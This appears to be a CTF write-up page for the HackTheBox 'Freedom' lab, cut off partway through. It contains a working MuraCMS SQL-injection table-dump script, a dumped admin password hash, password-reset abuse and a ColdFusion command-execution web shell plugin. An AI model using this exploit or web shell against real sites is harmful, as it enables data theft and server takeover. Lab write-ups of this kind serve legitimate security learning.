@@ -1,0 +1,227 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="CTF writeups, digital forensics, and cyber security notes by k3ng."><meta name="generator" content="Astro v7.1.1"><meta property="og:title" content="Freedom | k3ng.xyz"><meta property="og:description" content="CTF writeups, digital forensics, and cyber security notes by k3ng."><meta property="og:type" content="website"><link rel="icon" type="image/jpeg" href="/favicon.jpg"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet"><title>Freedom | k3ng.xyz</title><script>
+      const savedTheme = localStorage.getItem('theme');
+      const preferredTheme = matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+      document.documentElement.dataset.theme = savedTheme || preferredTheme;
+    </script><link rel="stylesheet" href="/_astro/BaseLayout.DZwBvaeU.css"></head><body><header class="site-header"><div class="header-inner"><a class="wordmark" href="/" aria-label="Home">k3ng</a><nav aria-label="Primary navigation"><a href="/blog">Blog</a><a href="/writeups" aria-current="page">Writeups</a><a href="/about">About</a></nav><button class="theme-toggle" type="button" aria-label="Toggle color theme"><span class="theme-light" aria-hidden="true">☼</span><span class="theme-dark" aria-hidden="true">☾</span></button></div></header><main class="article-shell has-toc"><article><header class="article-header"><p class="eyebrow">HTB University CTF 2024: Binary Badlands</p><h1>Freedom</h1><ul class="article-tags" aria-label="Article tags"><li>muracms</li><li>error-based-sql-injection</li><li>password-reset-abuse</li><li>coldfusion</li><li>wsl</li></ul></header><div class="prose"><h3 id="challenge-description">Challenge Description</h3>
+<p>In these challenging times, the voices of freedom are growing fainter. Help us identify potential vulnerabilities in our systems so we can safeguard them against the Frontier Board, which seeks to silence any dissenting opinions. Allow up to 3 minutes for all the services to properly boot.</p>
+<h3 id="flags">Flags</h3>
+<p>User flag: <code>HTB{c4n_y0u_pl34as3_cr4ck?}</code></p>
+<p>Root flag: <code>HTB{l34ky_h4ndl3rs_4th3_w1n}</code></p>
+<hr>
+<h3 id="enumeration">Enumeration</h3>
+<p>We start with <code>nmap</code> per usual, and we found an HTTP server, a DNS server and multiple services for Active Directory.</p>
+<p><img src="/images/freedom/freedom_1.png" alt=""></p>
+<p>After setting the hostname of this IP to <code>freedom.htb</code>, we can now access the website.</p>
+<p><img src="/images/freedom/freedom_2.png" alt=""></p>
+<p>From the HTML source code, we can see that this website is built using MuraCMS, evident from the JS and CSS files imported to the HTML.</p>
+<p><img src="/images/freedom/freedom_3.png" alt=""></p>
+<p>After some research, I have found an <a href="https://github.com/Stuub/CVE-2024-32640-SQLI-MuraCMS?tab=readme-ov-file#details">SQL Injection vulnerability</a> on this website. With this injection, I managed to dump every table using the script below. Credits to NeoZap for creating this script.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> re</span></span>
+<span class="line"><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> requests</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> sqli</span><span style="color:#E6EDF3">(payload):</span></span>
+<span class="line"><span style="color:#E6EDF3">    url </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> f</span><span style="color:#A5D6FF">"http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject&#x26;object=displayregion&#x26;contenthistid=</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">payload</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">&#x26;previewID=x"</span></span>
+<span class="line"><span style="color:#E6EDF3">    res </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> requests.get(url)</span></span>
+<span class="line"><span style="color:#E6EDF3">    data </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> res.json()</span></span>
+<span class="line"><span style="color:#FF7B72">    try</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">        table_name </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> re.findall(</span><span style="color:#FF7B72">r</span><span style="color:#A5D6FF">"'</span><span style="color:#7EE787;font-weight:bold">\n</span><span style="color:#79C0FF">(.</span><span style="color:#FF7B72">+?</span><span style="color:#79C0FF">)</span><span style="color:#A5D6FF">'"</span><span style="color:#E6EDF3">, data[</span><span style="color:#A5D6FF">"error"</span><span style="color:#E6EDF3">][</span><span style="color:#A5D6FF">"stacktrace"</span><span style="color:#E6EDF3">][</span><span style="color:#A5D6FF">"message"</span><span style="color:#E6EDF3">])[</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">]</span></span>
+<span class="line"><span style="color:#FF7B72">        return</span><span style="color:#E6EDF3"> table_name</span></span>
+<span class="line"><span style="color:#FF7B72">    except</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#FF7B72">        return</span><span style="color:#79C0FF"> None</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> fetch_data</span><span style="color:#E6EDF3">(query, use_chunks</span><span style="color:#FF7B72">=</span><span style="color:#79C0FF">False</span><span style="color:#E6EDF3">):</span></span>
+<span class="line"><span style="color:#A5D6FF">    """Fetch data with optional chunking for long values"""</span></span>
+<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#FF7B72"> not</span><span style="color:#E6EDF3"> use_chunks:</span></span>
+<span class="line"><span style="color:#8B949E">        # Try simple fetch first</span></span>
+<span class="line"><span style="color:#E6EDF3">        payload </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> f</span><span style="color:#A5D6FF">"x</span><span style="color:#FF7B72">\\</span><span style="color:#A5D6FF">' or updatexml(null,concat(0x0a,(</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">query</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">)),null) -- a"</span></span>
+<span class="line"><span style="color:#E6EDF3">        result </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> sqli(payload)</span></span>
+<span class="line"><span style="color:#8B949E">        # If result is 31 chars, it might be truncated - retry with chunks</span></span>
+<span class="line"><span style="color:#FF7B72">        if</span><span style="color:#E6EDF3"> result </span><span style="color:#FF7B72">and</span><span style="color:#79C0FF"> len</span><span style="color:#E6EDF3">(result) </span><span style="color:#FF7B72">==</span><span style="color:#79C0FF"> 31</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">            use_chunks </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> True</span></span>
+<span class="line"><span style="color:#FF7B72">        else</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#FF7B72">            return</span><span style="color:#E6EDF3"> result</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#E6EDF3"> use_chunks:</span></span>
+<span class="line"><span style="color:#E6EDF3">        full_data </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> ""</span></span>
+<span class="line"><span style="color:#E6EDF3">        chunk_size </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> 30</span></span>
+<span class="line"><span style="color:#E6EDF3">        chunk_index </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> 1</span></span>
+<span class="line"><span style="color:#FF7B72">        while</span><span style="color:#79C0FF"> True</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">            chunk_payload </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> f</span><span style="color:#A5D6FF">"x</span><span style="color:#FF7B72">\\</span><span style="color:#A5D6FF">' or updatexml(null,concat(0x0a,SUBSTRING((</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">query</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">), </span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">chunk_index</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">, </span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">chunk_size</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">)),null) -- a"</span></span>
+<span class="line"><span style="color:#E6EDF3">            chunk </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> sqli(chunk_payload)</span></span>
+<span class="line"><span style="color:#FF7B72">            if</span><span style="color:#FF7B72"> not</span><span style="color:#E6EDF3"> chunk </span><span style="color:#FF7B72">or</span><span style="color:#E6EDF3"> chunk </span><span style="color:#FF7B72">==</span><span style="color:#A5D6FF"> ""</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#FF7B72">                break</span></span>
+<span class="line"><span style="color:#E6EDF3">            full_data </span><span style="color:#FF7B72">+=</span><span style="color:#E6EDF3"> chunk</span></span>
+<span class="line"><span style="color:#E6EDF3">            chunk_index </span><span style="color:#FF7B72">+=</span><span style="color:#E6EDF3"> chunk_size</span></span>
+<span class="line"><span style="color:#FF7B72">        return</span><span style="color:#E6EDF3"> full_data</span></span>
+<span class="line"><span style="color:#E6EDF3">    </span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#79C0FF"> None</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> fetch_table</span><span style="color:#E6EDF3">(table_name):</span></span>
+<span class="line"><span style="color:#E6EDF3">    column_names </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> []</span></span>
+<span class="line"><span style="color:#E6EDF3">    data </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> []</span></span>
+<span class="line"><span style="color:#E6EDF3">    </span></span>
+<span class="line"><span style="color:#8B949E">    # Get column count</span></span>
+<span class="line"><span style="color:#E6EDF3">    payload </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> f</span><span style="color:#A5D6FF">"x</span><span style="color:#FF7B72">\\</span><span style="color:#A5D6FF">' or updatexml(null,concat(0x0a,(select COUNT(*) from information_schema.columns WHERE table_name=</span><span style="color:#FF7B72">\"{</span><span style="color:#E6EDF3">table_name</span><span style="color:#FF7B72">}\"</span><span style="color:#A5D6FF"> LIMIT 1)),null) -- a"</span></span>
+<span class="line"><span style="color:#E6EDF3">    columns_count </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> sqli(payload)</span></span>
+<span class="line"><span style="color:#E6EDF3">    </span></span>
+<span class="line"><span style="color:#8B949E">    # Fetch column names</span></span>
+<span class="line"><span style="color:#FF7B72">    for</span><span style="color:#E6EDF3"> i </span><span style="color:#FF7B72">in</span><span style="color:#79C0FF"> range</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">int</span><span style="color:#E6EDF3">(columns_count)):</span></span>
+<span class="line"><span style="color:#E6EDF3">        column_query </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> f</span><span style="color:#A5D6FF">"select column_name from information_schema.columns WHERE table_name=</span><span style="color:#FF7B72">\"{</span><span style="color:#E6EDF3">table_name</span><span style="color:#FF7B72">}\"</span><span style="color:#A5D6FF"> LIMIT </span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">i</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">,1"</span></span>
+<span class="line"><span style="color:#E6EDF3">        column_name </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> fetch_data(column_query)</span></span>
+<span class="line"><span style="color:#FF7B72">        if</span><span style="color:#E6EDF3"> column_name:</span></span>
+<span class="line"><span style="color:#E6EDF3">            column_names.append(column_name)</span></span>
+<span class="line"><span style="color:#FF7B72">        else</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#FF7B72">            break</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E">    # Get row count</span></span>
+<span class="line"><span style="color:#E6EDF3">    payload </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> f</span><span style="color:#A5D6FF">"x</span><span style="color:#FF7B72">\\</span><span style="color:#A5D6FF">' or updatexml(null,concat(0x0a,(select COUNT(*) from </span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">table_name</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF"> LIMIT 1)),null) -- a"</span></span>
+<span class="line"><span style="color:#E6EDF3">    length </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> sqli(payload)</span></span>
+<span class="line"><span style="color:#E6EDF3">    </span></span>
+<span class="line"><span style="color:#8B949E">    # Fetch all data</span></span>
+<span class="line"><span style="color:#FF7B72">    for</span><span style="color:#E6EDF3"> i </span><span style="color:#FF7B72">in</span><span style="color:#79C0FF"> range</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">int</span><span style="color:#E6EDF3">(length)):</span></span>
+<span class="line"><span style="color:#E6EDF3">        row </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> {}</span></span>
+<span class="line"><span style="color:#FF7B72">        for</span><span style="color:#E6EDF3"> column_name </span><span style="color:#FF7B72">in</span><span style="color:#E6EDF3"> column_names:</span></span>
+<span class="line"><span style="color:#E6EDF3">            data_query </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> f</span><span style="color:#A5D6FF">"select </span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">column_name</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF"> from </span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">table_name</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF"> LIMIT </span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">i</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">,1"</span></span>
+<span class="line"><span style="color:#E6EDF3">            value </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> fetch_data(data_query)</span></span>
+<span class="line"><span style="color:#E6EDF3">            row[column_name] </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> value</span></span>
+<span class="line"><span style="color:#E6EDF3">        data.append(row)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#E6EDF3"> data</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> fetch_all_tables</span><span style="color:#E6EDF3">():</span></span>
+<span class="line"><span style="color:#E6EDF3">    tables </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> []</span></span>
+<span class="line"><span style="color:#E6EDF3">    i </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> 0</span></span>
+<span class="line"><span style="color:#FF7B72">    while</span><span style="color:#79C0FF"> True</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">        query </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> f</span><span style="color:#A5D6FF">"select table_name from information_schema.tables LIMIT </span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">i</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">,1"</span></span>
+<span class="line"><span style="color:#E6EDF3">        table_name </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> fetch_data(query)</span></span>
+<span class="line"><span style="color:#FF7B72">        if</span><span style="color:#FF7B72"> not</span><span style="color:#E6EDF3"> table_name:</span></span>
+<span class="line"><span style="color:#FF7B72">            break</span></span>
+<span class="line"><span style="color:#79C0FF">        print</span><span style="color:#E6EDF3">(</span><span style="color:#FF7B72">f</span><span style="color:#A5D6FF">"[#</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">i</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">]: </span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">table_name</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">        table_data </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> fetch_table(table_name)</span></span>
+<span class="line"><span style="color:#79C0FF">        print</span><span style="color:#E6EDF3">(</span><span style="color:#FF7B72">f</span><span style="color:#A5D6FF">"[#</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">i</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">]: </span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">table_data</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">        tables.append({</span><span style="color:#A5D6FF">"table"</span><span style="color:#E6EDF3">: table_name, </span><span style="color:#A5D6FF">"data"</span><span style="color:#E6EDF3">: table_data})</span></span>
+<span class="line"><span style="color:#E6EDF3">        i </span><span style="color:#FF7B72">+=</span><span style="color:#79C0FF"> 1</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#E6EDF3"> tables</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">fetch_all_tables()</span></span></code></pre>
+<p>One interesting table is <code>tusers</code>since all user information is stored there. We can see that there is an admin account present.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="json"><code><span class="line"><span style="color:#8B949E">// cut and formatted for brevity</span></span>
+<span class="line"><span style="color:#E6EDF3">[</span></span>
+<span class="line"><span style="color:#8B949E">  // ...</span></span>
+<span class="line"><span style="color:#E6EDF3">  {</span></span>
+<span class="line"><span style="color:#7EE787">    "UserID"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"4117F4DF-028C-47CC-B953835D091F1E82"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "GroupName"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "Fname"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"Admin"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "Lname"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"User"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "UserName"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"admin"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "password"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"$2a$10$xHRN1/9qFGtMAPkwQeMLYes2ysff2K970UTQDneDwJBRqUP7X8g3q"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "PasswordCreated"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"2024-11-11 16:57:59"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "Email"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"admin@freedom.htb"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "Company"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "JobTitle"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "mobilePhone"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "Website"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "Type"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"2"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "subType"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"Default"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "Ext"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "ContactForm"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "Admin"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "S2"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"1"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "LastLogin"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"2024-12-02 11:25:13"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "LastUpdate"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"2024-11-11 08:46:23"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "LastUpdateBy"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"System"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "LastUpdateByID"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"22FC551F-FABE-EA01-C6EDD0885DDC1682"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "Perm"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"0"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "InActive"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"0"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "isPublic"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"0"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "SiteID"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"default"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "Subscribe"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"0"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "notes"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "description"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "interests"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "keepPrivate"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"0"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "photoFileID"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "IMName"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "IMService"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "created"</span><span style="color:#E6EDF3">:</span><span style="color:#A5D6FF">"2024-11-11 08:46:23"</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "remoteID"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "tags"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#7EE787">    "tablist"</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">null</span></span>
+<span class="line"><span style="color:#E6EDF3">  },</span></span>
+<span class="line"><span style="color:#8B949E">  // ...</span></span>
+<span class="line"><span style="color:#E6EDF3">]</span></span></code></pre>
+<h3 id="initial-access">Initial Access</h3>
+<p>After obtaining this information I realized since this is a CMS, there could be a reset password mechanism in place. Turns out, there is on the admin login on <code>http://freedom.htb/admin</code>.</p>
+<p><img src="/images/freedom/freedom_4.png" alt=""></p>
+<p>After entering the admin email and re-running the table dump script, I have found that the <code>tredirects</code>table will store the URL to edit the profile.</p>
+<p><img src="/images/freedom/freedom_5.png" alt=""></p>
+<p>When accessing the URL, we can now reset the admin’s password to persist our access.</p>
+<p><img src="/images/freedom/freedom_6.png" alt=""></p>
+<p>CMS applications usually have some sort of plugin systems, and that is also the case for Mura/MasaCMS. Since plugins are executable, we can leverage this to get some sort of RCE. I have made (re: asked ChatGPT to make me one) a MasaCMS plugin to run shell commands.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#8B949E">&#x3C;!--- execute.cfm ---></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">cftry</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#8B949E">    &#x3C;!--- Get the query parameter "cmd" ---></span></span>
+<span class="line"><span style="color:#E6EDF3">    &#x3C;</span><span style="color:#FFA198;font-style:italic">cfparam</span><span style="color:#79C0FF"> name</span><span style="color:#E6EDF3">=</span><span style="color:#A5D6FF">"url.cmd"</span><span style="color:#79C0FF"> default</span><span style="color:#E6EDF3">=</span><span style="color:#A5D6FF">""</span><span style="color:#E6EDF3">></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E">    &#x3C;!--- Use cfexecute to run the command from the query parameter ---></span></span>
+<span class="line"><span style="color:#E6EDF3">    &#x3C;</span><span style="color:#FFA198;font-style:italic">cfexecute</span><span style="color:#79C0FF"> name</span><span style="color:#E6EDF3">=</span><span style="color:#A5D6FF">"#url.cmd#"</span><span style="color:#79C0FF"> variable</span><span style="color:#E6EDF3">=</span><span style="color:#A5D6FF">"output"</span><span style="color:#79C0FF"> timeout</span><span style="color:#E6EDF3">=</span><span style="color:#A5D6FF">"10"</span><span style="color:#E6EDF3">>&#x3C;/</span><span style="color:#FFA198;font-style:italic">cfexecute</span><span style="color:#E6EDF3">></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E">    &#x3C;!--- Output the result ---></span></span>
+<span class="line"><span style="color:#E6EDF3">    &#x3C;</span><span style="color:#FFA198;font-style:italic">cfoutput</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">        Executed Command: #url.cmd#&#x3C;</span><span style="color:#7EE787">br</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">        Output: #output#</span></span>
+<span class="line"><span style="color:#E6EDF3">    &#x3C;/</span><span style="color:#FFA198;font-style:italic">cfoutput</span><span style="color:#E6EDF3">></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    &#x3C;</span><span style="color:#FFA198;font-style:italic">cfcatch</span><span style="color:#79C0FF"> type</span><span style="color:#E6EDF3">=</span><span style="color:#A5D6FF">"any"</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#8B949E">        &#x3C;!--- Handle errors securely ---></span></span>
+<span class="line"><span style="color:#E6EDF3">        &#x3C;</span><span style="color:#FFA198;font-style:italic">cfoutput</span><span style="color:#E6EDF3">>Error: #cfcatch.message#&#x3C;/</span><span style="color:#FFA198;font-style:italic">cfoutput</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">    &#x3C;/</span><span style="color:#FFA198;font-style:italic">cfcatch</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;/</span><span style="color:#FFA198;font-style:italic">cftry</span><span style="color:#E6EDF3">></span></span></code></pre>
+<p>And MasaCMS also needs a <code>config.xml.cfm</code>file on the <code>plugins/</code> directory. I basically stole this from the documentation.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">plugin</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">name</span><span style="color:#E6EDF3">>My First Plugin&#x3C;/</span><span style="color:#FFA198;font-style:italic">name</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">package</span><span style="color:#E6EDF3">>MyFirstPlugin&#x3C;/</span><span style="color:#FFA198;font-style:italic">package</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">loadPriority</span><span style="color:#E6EDF3">>5&#x3C;/</span><span style="color:#FFA198;font-style:italic">loadPriority</span><span style="color:#E6EDF3">></span></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;</span><span style="color:#FFA198;font-style:italic">version</span><span style="color:#E6EDF3">>1.0&#x3C;/</span><span style="color:#FFA198;font-style:italic">version</span><span style="color:#E6EDF3">></span></span>
